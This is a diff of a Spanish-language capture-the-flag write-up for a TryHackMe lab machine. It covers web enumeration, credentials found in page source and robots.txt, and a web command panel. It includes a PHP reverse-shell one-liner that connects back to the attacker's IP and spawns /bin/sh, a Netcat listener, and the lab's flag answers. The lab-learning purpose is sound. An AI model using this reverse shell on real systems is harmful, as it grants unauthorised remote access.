@@ -4,7 +4,9 @@ Máquina resuelta de *TryHackMe* en la que se trabaja la enumeración y *fingerp
   <img src="https://img.shields.io/badge/-Kali-5e8ca8?style=for-the-badge&logo=kalilinux&logoColor=white" />
   <img src="https://img.shields.io/badge/-Nmap-6933FF?style=for-the-badge&logo=nmap&logoColor=white" />
   <img src="https://img.shields.io/badge/-Dirsearch-005571?style=for-the-badge&logo=dirsearch&logoColor=white" />
+  <img src="https://img.shields.io/badge/-Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white" />
   <img src="https://img.shields.io/badge/-python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
+  <img src="https://img.shields.io/badge/-Netcat-F5455C?style=for-the-badge&logo=netcat&logoColor=white" />
 </div>
 
 ## Objetivo
@@ -21,7 +23,7 @@ Explicar la realización del siguiente _Capture the flag_ perteneciente a la pla
 
 - *Kali Linux*.
 - Enumeración: *Nmap*, *Dirsearch*.
-- Penetración: . 
+- Penetración: *Bash*, *PHP*, *Netcat*. 
 
 ## Steps
 
@@ -38,7 +40,6 @@ El comando devuelve 2 puertos TCPs abiertos:
 
 Primero nos dirigimos, desde el navegador, al puerot 80 de la IP dada, donde se puede ver un mensaje de ayuda de *Rick*. Si se inspecciona el código de la página se puede encontrar un comentario con el nombre de usuario *R1ckRul3s*.
 
-
 ![image](https://github.com/user-attachments/assets/52f9925c-635c-4310-bcb4-342b65b72e7e)
 
 Seguidamente, con la ayuda de la herramienta **Dirsearch**, se hace una enumeración de posibles directorios y archivos que se encuentren en la web. Por la parte de directorios, únicamente aparece '/assets' pero su contenido no aporta ninguna pista. Sin embargo,sí aparecen varios archivos interesantes que son alzanzables. *Dirsearch* es lanzado con **Python3** indicando la IP a atacar (-u) y la lista a utilizar para la enumeración (-w); en este caso la 'raft-small-files-lowercase.txt'.
@@ -53,14 +54,37 @@ Al dirigrnos al archivo '/robots.txt' se encuentra lo que parece ser una contras
 |---------|------------|
 | R1ckRul3s | Wubbalubbadubdub |
 
-Al hacer el *log in* se llega a un formulario que accepta comandos. Despues de realizar un <code>whoami</code> y un <code>pwd</code>, se descubre que somos el usuario 'www-data' y estamos en el directorio '/var/www/html'. Ejecutando <code>ls</code>, aparecen la lista de archivos que contiene el directorio entre los que destaca 'Sup3rS3cretPickl3Ingred.txt. Para leer el contenido de este archivo es necesario utilizar el comadno <code>less</code>, en lugar de <code>cat</code>, pues este está deshabilitado y de esta manera se encuentra el primer ingrediente.
 
-![image](https://github.com/user-attachments/assets/281596d6-0bb6-454a-99a9-bc4494a38749)
+### Vulnerabilidades explotadas
+
+Al hacer el *log in* se llega a un formulario que accepta comandos. Despues de realizar un <code>whoami</code> y un <code>pwd</code>, se descubre que somos el usuario 'www-data' y estamos en el directorio '/var/www/html'. Ejecutando <code>ls</code>, aparecen la lista de archivos que contiene el directorio entre los que destaca 'Sup3rS3cretPickl3Ingred.txt. Para leer el contenido de este archivo es necesario utilizar el comadno <code>less</code>, en lugar de <code>cat</code>, pues este está deshabilitado y de esta manera se encuentra el primer ingrediente.
 
 **Flag: mr. meeseek hair**
 
+![image](https://github.com/user-attachments/assets/281596d6-0bb6-454a-99a9-bc4494a38749)
 
-### Vulnerabilidades explotadas
+Otro archivo interesante para inspeccionar es 'clue.txt', el cual informa de buscar otro ingrediente alrededor del *file system*. Se intenta navegar por los directorios a través del panel de comandos pero no es posible y se encuentran muchas limitaciones. Por ese motivo se intentará hacer una *reverse shell* para penetrar la máquina y trabajar desde dentro.
+
+![Captura de pantalla 2025-04-08 174710](https://github.com/user-attachments/assets/efdbda6c-9acc-41bf-bac4-90fef94e646e)
+
+Después de comprobar que la máquina víctima tiene **PHP** instalado mediante el comando <code>which php</code>, me dispongo a hacer la *reverse* con el código sacado de la web de [*pentestmonkey*](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Únicamente es preciso cambiar la dirección IP por la de nuestra máquina atacante (en este caso, nos la proporciona THM mediante la VPN) y el puerto que pondremos en escucha.
+
+<code>php -r '$sock=fsockopen("10.23.92.113",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+
+Desde la máquina anfitriona se pone en escucha (-l) el puerto (-p) 1234 con la herramienta **Netcat**. Se le indica verbosidad (-v) para que muestre información como las conexiones establecidas y que no resuelva nombres de dominio (-n), solo se conecte a las direcciones IP, lo que hace que la conexión sea más rápida, evitando la resolución de DNS.
+
+![Captura de pantalla 2025-04-08 180322](https://github.com/user-attachments/assets/655dc72c-3564-4a25-be3f-409d1498901a)
+
+Una vez dentro, navegando hacia el directorio '/home/rick' aparece un archivo llamado 'second ingredients' donde se encuentra la segunda bandera. Desde dentro de la máquina ya se puede hacer uso de <code>cat</code> teniendo en cuenta que el archivo lo pondremos entre comas simples, pues su nombre está formado por dos palabras.
+
+<code>cat 'second ingredients'</code>
+
+**Flag: jerry tear**
+
+![Captura de pantalla 2025-04-08 180738](https://github.com/user-attachments/assets/0607b361-f320-4904-a919-d9dfc0f53ef5)
+
+
+
 
 
 **Flag: **
